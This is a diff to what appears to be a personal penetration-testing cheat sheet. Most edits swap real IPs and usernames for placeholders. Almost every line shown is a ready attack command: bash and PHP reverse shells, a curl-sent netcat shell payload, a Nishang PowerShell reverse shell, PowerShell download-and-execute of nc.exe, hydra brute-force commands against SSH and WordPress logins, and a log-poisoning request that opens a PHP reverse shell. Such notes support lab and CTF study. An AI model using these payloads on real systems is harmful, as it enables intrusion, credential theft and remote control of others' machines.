@@ -38,8 +38,8 @@ hashcat -a 0 -m <mode> <hash-file> /path/to/rockyou.txt --force
 
 Linux Shadow
 ------------
-buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
-buddy - login username
+nyau:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
+nyau - login username
 $6 - id of the hashing algorithm, id 6 is SHA-512
 $3GvJsNPG - salt of the hash
 $Zr.......P1 - hashed password
@@ -51,7 +51,7 @@ Moar:https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/password-crackin
 
 FTP file Transfer
 =================
-echo open 10.11.0.141 21> ftp.txt
+echo open x.x.x.x 21> ftp.txt
 echo USER root>> ftp.txt
 echo lab>> ftp.txt
 echo bin >> ftp.txt
@@ -91,14 +91,14 @@ Simple PHP Command Injection
 <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
 
 
-bash -i >& /dev/tcp/x.x.x.x/1313 0>&1
-curl -s --data "<?system('nc -lvp 1313 -e /bin/sh');?>" "http://x.x.x.x/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
+bash -i >& /dev/tcp/x.x.x.x/1234 0>&1
+curl -s --data "<?system('nc -lvp 1234 -e /bin/sh');?>" "http://x.x.x.x/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
 
 Windows Powershell
 ==================
 Nishang -PS reverse tcp
 Copy the .Example to the bottom of the script
-Invoke-PowershellTcp -Reverse -IPAddress 192.10.10.23 -Port 1313
+Invoke-PowershellTcp -Reverse -IPAddress x.x.x.x -Port 1234
 
 Downloading from PS prompt:IEX(New-Object Net.Webclient).downloadString('http://x.x.x.x:8000/nc.exe')
 (New-Object System.Net.WebClient).DownloadFile("http://x.x.x.x:8000/nc.exe", "C:\Windows\Temp\Privesc\nc.exe")  
@@ -191,11 +191,11 @@ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u b******.*** -v
 Brute_Forcing Logins
 ====================
 SSH: hydra -s 22 -v -V -l root -P /usr/share/wordlists/rockyou.txt -t 8 IP ssh
-HTTP: hydra -l james -P wordlist.txt IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+HTTP: hydra -l username -P wordlist.txt IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
 
       hydra -L usernames.txt -P passwords.txt IP http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
       
-      hydra -l Elliot -P fsocity.dic 10.10.27.6 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.27.6%2Fwp-admin%2F&testcookie=1:S=302" -v -V
+      hydra -l username -P password.dic x.x.x.x http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.27.6%2Fwp-admin%2F&testcookie=1:S=302" -v -V
 
       
 NFS
@@ -235,7 +235,7 @@ grep -v "^[A-Za-z0-9]*$" > contains_special.txt
 
 PHP Reverse Shell with log_poisoning
 ====================================
-GET /?view=/dog/../../../../../../../var/log/apache2/access.log&ext&cmd=php+-r+'$sock%3dfsockopen("10.9.65.210",1313)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
-Host: 10.10.206.247 
+GET /?view=/dog/../../../../../../../var/log/apache2/access.log&ext&cmd=php+-r+'$sock%3dfsockopen("x.x.x.x",1313)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
+Host: x.x.x.x 
 User-Agent: <?php system($_GET['cmd']);?>
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
